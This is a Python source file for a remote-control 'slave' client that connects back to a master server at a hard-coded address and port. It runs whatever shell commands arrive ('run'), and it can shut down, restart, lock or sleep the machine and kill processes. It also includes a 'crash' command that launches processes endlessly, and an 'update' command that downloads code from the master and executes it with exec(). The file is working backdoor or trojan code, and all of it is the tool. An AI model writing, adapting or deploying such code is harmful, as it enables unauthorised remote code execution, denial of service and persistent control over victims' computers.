import socket
import os
import time
import threading
import sys

if os.path.exists("old.pyw"):
    time.sleep(1)
    os.remove("old.pyw")

if os.path.exists("old.py"):
    time.sleep(1)
    os.remove("old.py")

try:
    import psutil
except:
    print("[PYTHON] Missing package. Installing...")
    os.system("pip install psutil")

VERSION = "1.1.0"
IP = "10.0.0.126"
PORT = 5050
ADDR = (IP, PORT)

slave = None

def connect():
    global slave
    while True:
        time.sleep(1)
        try:
            slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            slave.connect(ADDR)
            print("[MASTER] Master has been found")
            break
        except:
            print("[SOCKET] Waiting for master...")
            continue
    return True

def handle_received(received):
    received = received.decode()
    args = received.split(" ")
    command = args[0]
    if command:
        if command == "run":
            to_run = " ".join(args[1:])
            if to_run:
                os.system(to_run)
                return "$approved".encode()
            else:
                return "$error".encode()
        elif command == "shutdown":
            os.system("shutdown /s /t 1")
            return "$approved".encode()
        elif command == "restart":
            os.system("shutdown /r /t 1")
            return "$approved".encode()
        elif command == "logout":
            os.system("shutdown /l /t 1")
            return "$approved".encode()
        elif command == "lock":
            os.system("Rundll32.exe user32.dll,LockWorkStation")
            return "$approved".encode()
        elif command == "crash":
            while True:
                time.sleep(0.01)
                os.system("start")
            os.system("shutdown /r /t 1")
            return "$approved".encode()
        elif command == "processes":
            for process in psutil.process_iter():
                try:
                    time.sleep(0.1)
                    name = process.name()
                    to_send = name.encode()
                    slave.send(to_send)
                except:
                    continue
            return "$approved".encode()
        elif command == "sleep":
            os.system("rundll32.exe powrprof.dll, SetSuspendState Sleep")
            return "$approved".encode()
        elif command == "close":
            process = " ".join(args[1:])
            os.system(f"taskkill /F /IM {process}")
            return "$approved".encode()
        elif command == "search":
            website = " ".join(args[1:])
            os.system(f"start msedge {website}")
            return "$approved".encode()
        elif command == "exit":
            os.system(f"taskkill /F /IM pythonw.exe")
            os.system(f"taskkill /F /IM pyw.exe")
            os._exit(1)
            return "$approved".encode()
        elif command == "update":
            print("[UPDATE] Starting update process...")
            newSlaveFile = open("updateFile.pyw", "x")
            print("[UPDATE] Created temporary update file")
            origName = os.path.basename(__file__)
            os.rename(__file__, "old.pyw")
            print("[UPDATE] Renamed this file to old.pyw")
            fileSize = ""
            while fileSize == "":
                fileSize = slave.recv(2048).decode("utf-8")
            if fileSize:
                fileSize = int(fileSize)
                print(f"[UPDATE] Update size received ({fileSize} bytes)")
                fileData = ""
                while fileData == "":
                    fileData = slave.recv(fileSize).decode("utf-8")
                if fileData:
                    print("[UPDATE] Update data received")
                    newSlaveFile.write(fileData)
                    print("[UPDATE] Wrote data to temporary update file")
                    newSlaveFile.close()
                    os.rename("updateFile.pyw", origName)
                    newSlaveFile = open(origName, "r")
                    print("[UPDATE] Renamed temporary update file to slave.pyw")
                    print("[UPDATE] Starting new update...")
                    exec(newSlaveFile.read())
                    print("[UPDATE] New update started")
                    print("[UPDATE] Terminating this file...")
                    os._exit(1)
                    return "$approved"
        elif command == "version":
            slave.send(VERSION.encode())
            time.sleep(1)
            return "$approved".encode()
        else:
            return "$error".encode()
    return "$error".encode()
            

def main():
    connect()
    while True:
        received = None
        try:
            received = slave.recv(2048)
        except:
            slave.close()
            connect()
            continue
        to_return = handle_received(received)
        if to_return:
            slave.send(to_return)
        continue

print("[SCRIPT] Running main function...")
main()
